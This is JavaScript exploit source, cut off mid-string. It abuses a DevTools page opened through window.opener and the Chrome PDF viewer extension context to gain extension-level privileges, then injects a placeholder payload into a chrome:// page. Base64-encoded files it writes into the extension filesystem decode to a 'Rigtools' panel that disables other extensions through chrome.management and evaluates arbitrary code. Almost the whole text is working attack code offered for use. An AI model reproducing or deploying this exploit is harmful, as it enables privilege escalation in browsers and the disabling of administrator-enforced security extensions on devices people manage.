((function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open("devtools://devtools/bundled/inspector.html");
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    await writeFile('index.js', atob(`Y29uc3QgbWFuYWdlbWVudFRlbXBsYXRlID0gYAo8ZGl2IGlkPSJjaHJvbWVfbWFuYWdlbWVudF9kaXNhYmxlX2V4dCI+CiAgPGgxPiBUb2dnbGUgRXh0ZW5zaW9ucyA8L2gxPgogIDxkaXYgY2xhc3M9ImV4dGxpc3QiPjwvZGl2Pgo8L2Rpdj4KYDsKCmxldCBzYXZlZEV4dExpc3QgPSBbXTsKCmZ1bmN0aW9uIGNyZWF0ZVN3aXRjaEJ1dHRvbihpc09uKSB7CiAgY29uc3QgbGFiZWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwogIGxhYmVsLmNsYXNzTmFtZSA9ICJzd2l0Y2giOwoKICBjb25zdCBpbnB1dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CiAgaW5wdXQudHlwZSA9ICJjaGVja2JveCI7CiAgaW5wdXQuY2hlY2tlZCA9IGlzT247CgogIGNvbnN0IHNwYW4gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CiAgc3Bhbi5jbGFzc05hbWUgPSAic2xpZGVyIjsKCiAgbGFiZWwuYXBwZW5kQ2hpbGQoaW5wdXQpOwogIGxhYmVsLmFwcGVuZENoaWxkKHNwYW4pOwogIHJldHVybiB7IGxhYmVsLCBpbnB1dCB9Owp9CgpmdW5jdGlvbiB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0bGlzdF9lbGVtZW50KSB7CiAgcmV0dXJuIG5ldyBQcm9taXNlKGZ1bmN0aW9uIChyZXNvbHZlKSB7CiAgICBleHRsaXN0X2VsZW1lbnQuaW5uZXJIVE1MID0gIiI7CiAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoZnVuY3Rpb24gKGV4dGxpc3QpIHsKICAgICAgY29uc3Qgb3JkbGlzdCA9IFtdOwogICAgICBleHRsaXN0LmZvckVhY2goZnVuY3Rpb24gKGUpIHsKICAgICAgICBpZiAoZS5pZCA9PT0gbmV3IFVSTChuZXcgVVJMKGxvY2F0aW9uLmhyZWYpLm9yaWdpbikuaG9zdCkgewogICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBvcmRsaXN0LnB1c2goZSk7CgogICAgICAgIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIGNvbnRhaW5lci5jbGFzc05hbWUgPSAiZXh0ZW5zaW9uLWl0ZW0iOwoKICAgICAgICBjb25zdCB0aXRsZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKICAgICAgICB0aXRsZS50ZXh0Q29udGVudCA9IGUubmFtZTsKCiAgICAgICAgY29uc3QgeyBsYWJlbDogc3dpdGNoTGFiZWwsIGlucHV0OiBzd2l0Y2hJbnB1dCB9ID0gY3JlYXRlU3dpdGNoQnV0dG9uKGUuZW5hYmxlZCk7CgogICAgICAgIHN3aXRjaElucHV0Lm9uY2xpY2sgPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgICBjb25zdCBuZXdTdGF0dXMgPSBzd2l0Y2hJbnB1dC5jaGVja2VkOwogICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChlLmlkLCBuZXdTdGF0dXMsIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgZS5lbmFibGVkID0gbmV3U3RhdHVzOwogICAgICAgICAgfSk7CiAgICAgICAgfTsKCiAgICAgICAgY29udGFpbmVyLmFwcGVuZENoaWxkKHRpdGxlKTsKICAgICAgICBjb250YWluZXIuYXBwZW5kQ2hpbGQoc3dpdGNoTGFiZWwpOwogICAgICAgIGV4dGxpc3RfZWxlbWVudC5hcHBlbmRDaGlsZChjb250YWluZXIpOwogICAgICB9KTsKICAgICAgc2F2ZWRFeHRMaXN0ID0gb3JkbGlzdDsKICAgICAgcmVzb2x2ZSgpOwogICAgfSk7CiAgfSk7Cn0KCmNvbnN0IHN0eWxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc3R5bGUnKTsKc3R5bGUuaW5uZXJIVE1MID0gYAogIC5zd2l0Y2ggewogICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgd2lkdGg6IDUwcHg7CiAgICBoZWlnaHQ6IDI0cHg7CiAgICBtYXJnaW4tbGVmdDogMTBweDsKICB9CiAgLnN3aXRjaCBpbnB1dCB7CiAgICBvcGFjaXR5OiAwOwogICAgd2lkdGg6IDA7CiAgICBoZWlnaHQ6IDA7CiAgfQogIC5zbGlkZXIgewogICAgcG9zaXRpb246IGFic29sdXRlOwogICAgY3Vyc29yOiBwb2ludGVyOwogICAgdG9wOiAwOyBsZWZ0OiAwOwogICAgcmlnaHQ6IDA7IGJvdHRvbTogMDsKICAgIGJhY2tncm91bmQtY29sb3I6ICNjY2M7CiAgICB0cmFuc2l0aW9uOiAuNHM7CiAgICBib3JkZXItcmFkaXVzOiAyNHB4OwogIH0KICAuc2xpZGVyOmJlZm9yZSB7CiAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICBjb250ZW50OiAiIjsKICAgIGhlaWdodDogMThweDsKICAgIHdpZHRoOiAxOHB4OwogICAgbGVmdDogM3B4OwogICAgYm90dG9tOiAzcHg7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB3aGl0ZTsKICAgIHRyYW5zaXRpb246IC40czsKICAgIGJvcmRlci1yYWRpdXM6IDUwJTsKICB9CiAgaW5wdXQ6Y2hlY2tlZCArIC5zbGlkZXIgewogICAgYmFja2dyb3VuZC1jb2xvcjogIzRDQUY1MDsKICB9CiAgaW5wdXQ6Y2hlY2tlZCArIC5zbGlkZXI6YmVmb3JlIHsKICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWCgyNnB4KTsKICB9CiAgLmV4dGVuc2lvbi1pdGVtIHsKICAgIG1hcmdpbjogMTBweCAwOwogICAgZGlzcGxheTogZmxleDsKICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47CiAgfQpgOwpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHN0eWxlKTsKCmNvbnN0IHNsaWRlcyA9IFtdOwpsZXQgYWN0aXZlU2xpZGVJZHggPSAwOwpjb25zdCBoYW5kbGVDYWxsYmFja3NfID0gW107CmNvbnN0IFdBSVRfRk9SX0ZJTklTSCA9IDE7CgpyZXF1ZXN0QW5pbWF0aW9uRnJhbWUoZnVuY3Rpb24gYSh0KSB7CiAgZm9yIChjb25zdCBjYiBvZiBoYW5kbGVDYWxsYmFja3NfKSB7CiAgICBsZXQgbTsKICAgIGlmIChtID0gKGNiLmYuYXBwbHkobnVsbCwgW3QgLSBjYi50XSkpKSB7CiAgICAgIGlmIChtID09PSAxKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9IGVsc2UgewogICAgICAgIGhhbmRsZUNhbGxiYWNrc18uc3BsaWNlKGhhbmRsZUNhbGxiYWNrc18uaW5kZXhPZihjYiksIDEpOwogICAgICB9CiAgICB9CiAgfQogIHJlcXVlc3RBbmltYXRpb25GcmFtZShhKTsKfSk7Cgpjb25zdCBoYW5kbGVJbkFuaW1hdGlvbkZyYW1lID0gKGNiLCB0aGl6ID0gbnVsbCwgYXJncyA9IFtdKSA9PiB7CiAgaGFuZGxlQ2FsbGJhY2tzXy5wdXNoKHsKICAgIGY6IGNiLAogICAgdDogcGVyZm9ybWFuY2Uubm93KCkKICB9KTsKfTsKCmNsYXNzIEV4dGVuc2lvbkNhcGFiaWxpdGllcyB7CiAgc3RhdGljIHNldHVwU2xpZGVzKGFjdGl2ZWlkeCA9IDApIHsKICAgIGlmIChjaHJvbWUubWFuYWdlbWVudCkgewogICAgICBzbGlkZXMucHVzaChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2hyb21lX21hbmFnZW1lbnRfZGlzYWJsZV9leHQnKSk7CiAgICB9CiAgICBzbGlkZXMucHVzaChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjZXh0X2RlZmF1bHQnKSk7CiAgICBmb3IgKGxldCBpID0gMDsgaSA8IHNsaWRlcy5sZW5ndGg7IGkrKykgewogICAgICBpZiAoaSA9PT0gYWN0aXZlaWR4KSB7CiAgICAgICAgc2xpZGVzW2ldLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgICB9IGVsc2UgewogICAgICAgIHNsaWRlc1tpXS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICB9CiAgICB9CiAgICBhY3RpdmVTbGlkZUlkeCA9IGFjdGl2ZWlkeDsKCiAgICBvbmtleWRvd24gPSBmdW5jdGlvbiAoZXYpIHsKICAgICAgaWYgKGV2LnJlcGVhdCkgcmV0dXJuOwogICAgICBpZiAodGhpcy5nZXRTZWxlY3Rpb24oKSAmJiB0aGlzLmdldFNlbGVjdGlvbigpLmFuY2hvck5vZGUudGFnTmFtZSkgewogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBpZiAoZXYua2V5LnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoImxlZnQiKSkgewogICAgICAgIGFjdGl2ZVNsaWRlSWR4LS07CiAgICAgICAgaWYgKGFjdGl2ZVNsaWRlSWR4IDwgMCkgewogICAgICAgICAgYWN0aXZlU2xpZGVJZHggKz0gc2xpZGVzLmxlbmd0aDsKICAgICAgICB9CiAgICAgICAgYWN0aXZlU2xpZGVJZHggJT0gc2xpZGVzLmxlbmd0aDsKICAgICAgICBldi5wcmV2ZW50RGVmYXVsdCgpOwogICAgICB9CiAgICAgIGlmIChldi5rZXkudG9Mb3dlckNhc2UoKS5pbmNsdWRlcygicmlnaHQiKSkgewogICAgICAgIGFjdGl2ZVNsaWRlSWR4Kys7CiAgICAgICAgaWYgKGFjdGl2ZVNsaWRlSWR4IDwgMCkgewogICAgICAgICAgYWN0aXZlU2xpZGVJZHggKz0gc2xpZGVzLmxlbmd0aDsKICAgICAgICB9CiAgICAgICAgYWN0aXZlU2xpZGVJZHggJT0gc2xpZGVzLmxlbmd0aDsKICAgICAgICBldi5wcmV2ZW50RGVmYXVsdCgpOwogICAgICB9CiAgICAgIEV4dGVuc2lvbkNhcGFiaWxpdGllcy5zZXRBY3RpdmVTbGlkZUluZGV4KGFjdGl2ZVNsaWRlSWR4KTsKICAgIH07CiAgfQogIHN0YXRpYyBzZXRBY3RpdmVTbGlkZUluZGV4KGlkeCkgewogICAgZnVuY3Rpb24gYSh0KSB7CiAgICAgIGNvbnN0IHNlY29uZHMgPSB0IC8gMTAwMDsKICAgICAgaWYgKHNlY29uZHMgPj0gMC4yKSB7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgIH0KICAgICAgc2xpZGVzW2lkeF0uc3R5bGUub3BhY2l0eSA9IFN0cmluZyhzZWNvbmRzIC8gMC4yKTsKICAgIH0KICAgIGZvciAobGV0IGkgPSAwOyBpIDwgc2xpZGVzLmxlbmd0aDsgaSsrKSB7CiAgICAgIGlmIChpID09PSBpZHgpIHsKICAgICAgICBzbGlkZXNbaV0uc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgaWYgKHNsaWRlc1tpXS5zdHlsZS5kaXNwbGF5ID09PSAiYmxvY2siKSB7CiAgICAgICAgICBzbGlkZXNbaV0uc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwogICAgICAgICAgY29uc3QgbSA9IGk7CiAgICAgICAgICBoYW5kbGVJbkFuaW1hdGlvbkZyYW1lKGZ1bmN0aW9uICh0KSB7CiAgICAgICAgICAgIGNvbnN0IHNlY29uZHMgPSB0IC8gMTAwMDsKICAgICAgICAgICAgaWYgKDAuOCAtIHNlY29uZHMgPD0gMCkgewogICAgICAgICAgICAgIHNsaWRlc1tpXS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgICAgICAgIGhhbmRsZUluQW5pbWF0aW9uRnJhbWUoYSk7CiAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgc2xpZGVzW2ldLnN0eWxlLm9wYWNpdHkgPSBTdHJpbmcoKDAuMiAtIHNlY29uZHMpIC8gMC4yKTsKICAgICAgICAgIH0pOwogICAgICAgIH0KICAgICAgfQogICAgfQogIH0KICBhY3RpdmF0ZSgpIHt9Cn0KCmNsYXNzIERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMgZXh0ZW5kcyBFeHRlbnNpb25DYXBhYmlsaXRpZXMgewogIHN0YXRpYyB0ZW1wbGF0ZSA9IGAKICA8ZGl2IGlkPSJleHRfZGVmYXVsdCI+CiAgICA8ZGl2IGlkPSJkZWZhdWx0X2V4dGVuc2lvbl9jYXBhYmlsaXRpZXMiPgogICAgICA8aDE+IERlZmF1bHQgRXh0ZW5zaW9uIENhcGFiaWxpdGllcyA8L2gxPgogICAgICA8aDI+RXZhbHVhdGUgY29kZTwvaDI+CiAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0iY29kZV9pbnB1dCIvPjxidXR0b24gaWQ9ImNvZGVfZXZhbHVhdGUiPkV2YWx1YXRlPC9idXR0b24+CiAgICA8L2Rpdj4KICAgIDxkaXYgaWQ9ImV4dGVuc2lvbl90YWJzX2RlZmF1bHQiPgogICAgICA8YnV0dG9uIGlkPSJ0YWJyZWxvYWQiPiBSZWZyZXNoIFRhYnM8L2J1dHRvbj4KICAgICAgPGgxPiBVcGRhdGUgdGFicyA8L2gxPgogICAgICA8b2w+PC9vbD4KICAgICAgPGlucHV0IGlkPSJUYWJVUkxJbnB1dCIgLz4gPGJ1dHRvbiBpZD0iVGFiVVJMU3VibWl0Ij5DcmVhdGU8L2J1dHRvbj4KICAgIDwvZGl2PgogIDwvZGl2PgogIGA7CiAgdXBkYXRlVGFiTGlzdCh0YWJsaXN0LCBpc1RhYlRpdGxlUXVlcnlhYmxlLCB0YWJTdGF0dXMpIHsKICAgIGlmICh0aGlzLmRpc2FybWVkKSB7CiAgICAgIHJldHVybjsKICAgIH0KICAgIGlmICh0aGlzLnRhYkxpc3RJblByb2dyZXNzKSB7CiAgICAgIHJldHVybjsKICAgIH0KICAgIHRoaXMudGFiTGlzdEluUHJvZ3Jlc3MgPSB0cnVlOwogICAgdGFibGlzdC5pbm5lckhUTUwgPSAiIjsKICAgIGNvbnN0IHRoaXogPSB0aGlzOwogICAgY2hyb21lLndpbmRvd3MuZ2V0QWxsKGZ1bmN0aW9uICh3aW4pIHsKICAgICAgd2luLmZvckVhY2goZnVuY3Rpb24gKHYpIHsKICAgICAgICBjaHJvbWUudGFicy5xdWVyeSh7IHdpbmRvd0lkOiB2LmlkIH0sIGZ1bmN0aW9uICh0YWJJbmZvcykgewogICAgICAgICAgdGFiSW5mb3MuZm9yRWFjaChmdW5jdGlvbiAoaW5mbykgewogICAgICAgICAgICBjb25zdCBsaXN0SXRlbSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxpIik7CiAgICAgICAgICAgIGxpc3RJdGVtLnRleHRDb250ZW50ID0gaXNUYWJUaXRsZVF1ZXJ5YWJsZQogICAgICAgICAgICAgID8gYCR7aW5mby50aXRsZX0gKCR7aW5mby51cmx9KWAKICAgICAgICAgICAgICA6ICIobm90IGF2YWlsYWJsZSkiOwogICAgICAgICAgICBsaXN0SXRlbS5pbm5lckhUTUwgKz0gJzxici8+PGlucHV0IHR5cGU9InRleHQiIC8+IDxidXR0b24+TmF2aWdhdGU8L2J1dHRvbj4nOwogICAgICAgICAgICBjb25zdCBidXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKICAgICAgICAgICAgYnV0dG9uLmlubmVySFRNTCA9ICJQcmV2aWV3IjsKICAgICAgICAgICAgbGlzdEl0ZW0ucXVlcnlTZWxlY3RvcignYnV0dG9uJykub25jbGljayA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICBjb25zdCBpbnAgPSBsaXN0SXRlbS5xdWVyeVNlbGVjdG9yKCdpbnB1dCcpOwogICAgICAgICAgICAgIGNocm9tZS50YWJzLnVwZGF0ZShpbmZvLmlkLCB7IHVybDogaW5wLnZhbHVlIH0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGJ1dHRvbi5vbmNsaWNrID0gKCkgPT4gewogICAgICAgICAgICAgIHRoaXouZGlzYXJtID0gdHJ1ZTsKICAgICAgICAgICAgICB0aGl6LnByZXZpZXdpbmcgPSB0cnVlOwogICAgICAgICAgICAgIGNocm9tZS53aW5kb3dzLnVwZGF0ZShpbmZvLndpbmRvd0lkLCB7IGZvY3VzZWQ6IHRydWUgfSwgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgY2hyb21lLnRhYnMudXBkYXRlKGluZm8uaWQsIHsgYWN0aXZlOiB0cnVlIH0pOwogICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgIHdpbmRvdy5jdXJyZW50VGltZW91dCA9IHNldFRpbWVvdXQoZnVuY3Rpb24gbSgpIHsKICAgICAgICAgICAgICAgIGNsZWFyVGltZW91dCh3aW5kb3cuY3VycmVudFRpbWVvdXQpOwogICAgICAgICAgICAgICAgY2hyb21lLnRhYnMuZ2V0Q3VycmVudChmdW5jdGlvbiAodGFiKSB7CiAgICAgICAgICAgICAgICAgIGNocm9tZS53aW5kb3dzLnVwZGF0ZSh0YWIud2luZG93SWQsIHsgZm9jdXNlZDogdHJ1ZSB9LCBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMudXBkYXRlKHRhYi5pZCwgeyBhY3RpdmU6IHRydWUgfSk7CiAgICAgICAgICAgICAgICAgICAgdGhpei5kaXNhcm0gPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICB0aGl6LnByZXZpZXdpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICB9LCAxMDApOwogICAgICAgICAgICB9OwogICAgICAgICAgICB0YWJsaXN0LmFwcGVuZENoaWxkKGxpc3RJdGVtKTsKICAgICAgICAgICAgdGFibGlzdC5hcHBlbmRDaGlsZChidXR0b24pOwogICAgICAgICAgfSk7CiAgICAgICAgICB0aGl6LnRhYkxpc3RJblByb2dyZXNzID0gZmFsc2U7CiAgICAgICAgfSk7CiAgICAgIH0pOwogICAgfSk7CiAgfQogIGFjdGl2YXRlKCkgewogICAgZG9jdW1lbnQud3JpdGUoRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy50ZW1wbGF0ZSk7CiAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNleHRfZGVmYXVsdCIpLnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbicpLmZvckVhY2goKGJ0bikgPT4gewogICAgICBidG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCB0aGlzLm9uQnRuQ2xpY2tfLmJpbmQodGhpcywgYnRuKSk7CiAgICB9KTsKICAgIHRoaXMudXBkYXRlVGFiTGlzdChkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoJyNleHRlbnNpb25fdGFic19kZWZhdWx0JykucXVlcnlTZWxlY3Rvcignb2wnKSwgKCEhY2hyb21lLnJ1bnRpbWUuZ2V0TWFuaWZlc3QoKS5wZXJtaXNzaW9ucy5pbmNsdWRlcygndGFicycpKSk7CiAgfQogIHN0YXRpYyBnZXRGUygpIHsKICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gewogICAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShURU1QT1JBUlksIDIgKiAxMDI0ICogMTAyNCwgcmVzb2x2ZSk7CiAgICB9KTsKICB9CiAgYXN5bmMgb25CdG5DbGlja18oYikgewogICAgc3dpdGNoIChiLmlkKSB7CiAgICAgIGNhc2UgImNvZGVfZXZhbHVhdGUiOiB7CiAgICAgICAgY29uc3QgeCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjb2RlX2lucHV0IikudmFsdWU7CiAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmdldEZTKCk7CiAgICAgICAgZnVuY3Rpb24gd3JpdGVGaWxlKGZpbGUsIGRhdGEpIHsKICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gewogICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgeyBjcmVhdGU6IHRydWUgfSwgZnVuY3Rpb24gKGVudHJ5KSB7CiAgICAgICAgICAgICAgZW50cnkucmVtb3ZlKGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7IGNyZWF0ZTogdHJ1ZSB9LCBmdW5jdGlvbiAoZW50cnkpIHsKICAgICAgICAgICAgICAgICAgZW50cnkuY3JlYXRlV3JpdGVyKGZ1bmN0aW9uICh3cml0ZXIpIHsKICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgfSk7CiAgICAgICAgfQogICAgICAgIGNvbnN0IHVybCA9IGF3YWl0IHdyaXRlRmlsZSgic3JjLmpzIiwgeCk7CiAgICAgICAgbGV0IHNjcmlwdCA9IGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigiI2V2YWx1YXRlX2VsZW0iKSA/PyBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHQucmVtb3ZlKCk7CiAgICAgICAgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgc2NyaXB0LmlkID0gImV2YWx1YXRlX2VsZW0iOwogICAgICAgIHNjcmlwdC5zcmMgPSB1cmw7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOwogICAgICB9IGJyZWFrOwogICAgICBjYXNlICJ0YWJyZWxvYWQiOiB7CiAgICAgICAgdGhpcy51cGRhdGVUYWJMaXN0KGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcignI2V4dGVuc2lvbl90YWJzX2RlZmF1bHQnKS5xdWVyeVNlbGVjdG9yKCdvbCcpLCAoISFjaHJvbWUucnVudGltZS5nZXRNYW5pZmVzdCgpLnBlcm1pc3Npb25zLmluY2x1ZGVzKCd0YWJzJykpKTsKICAgICAgfSBicmVhazsKICAgIH0KICB9Cn0KCmNsYXNzIEhvc3RQZXJtaXNzaW9ucyB7CiAgYWN0aXZhdGUoKSB7fQp9Cgp3aW5kb3cub25sb2FkID0gYXN5bmMgZnVuY3Rpb24gKCkgewogIGxldCBmb3VuZE5vdGhpbmcgPSB0cnVlOwogIGRvY3VtZW50Lm9wZW4oKTsKICBpZiAoY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZCkgewogICAgZG9jdW1lbnQud3JpdGUobWFuYWdlbWVudFRlbXBsYXRlKTsKICAgIGNvbnN0IGV4dGxpc3RfZWxlbWVudCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5leHRsaXN0Iik7CiAgICBhd2FpdCB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0bGlzdF9lbGVtZW50KTsKICB9CiAgbmV3IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMoKS5hY3RpdmF0ZSgpOwogIGRvY3VtZW50LmNsb3NlKCk7CiAgRXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLnNldHVwU2xpZGVzKCk7Cn07`))
                    const url = await writeFile('index.html', `${atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPkV4dGVuc2lvbiBFdmFsIC0gUmlndG9vbHM8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keT4KICA8ZGl2IGlkPSJwYXJ0aWNsZXMtanMiPjwvZGl2PgogIDxkaXYgY2xhc3M9Im1haW4iPgogICAgPGgxPk5vIHBheWxvYWRzIGFyZSBhdmFpbGFibGU8L2gxPgogICAgPHA+Tm8gcGF5bG9hZHMgY3VycmVudGx5IGF2YWlsYWJsZSBmb3IgeW91ciBleHRlbnNpb24uIFRyeSBhbm90aGVyIGV4dGVuc2lvbi4KICAgICAgV2UgYXJlIGN1cnJlbnRseSBkZXZlbG9waW5nIHBheWxvYWRzIGZvciBvdGhlciBBUElzLjwvcD4KICAgIDxwPkF2YWlsYWJsZSBwYXlsb2FkcyBmb3IgcGVybWlzc2lvbnM6PC9wPgogICAgPHVsPgogICAgICA8bGk+bWFuYWdlbWVudDwvbGk+CiAgICA8L3VsPgogIDwvZGl2PgoKICA8IS0tIDxzdHlsZT4KICAgIGJvZHkgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUyMDMwOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOwogICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgfQoKICAgIGEgewogICAgICBjb2xvcjogI2I3YmRmODsKICAgIH0KCiAgICAubWFpbiB7CiAgICAgIHRvcDogNTAlOwogICAgICBsZWZ0OiA1MCU7CiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7CiAgICAgIGJvcmRlcjogM3B4IHNvbGlkIHdoaXRlOwogICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgcGFkZGluZzogNSU7CiAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzI0MjczYTsKICAgIH0KCiAgICAuYnV0dG9uIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2E2ZGE5NTsKICAgICAgYm9yZGVyOiBub25lOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIHBhZGRpbmc6IDEwcHggMjBweDsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICBtYXJnaW46IDRweCAycHg7CiAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgfQoKICAgIHVsIHsKICAgI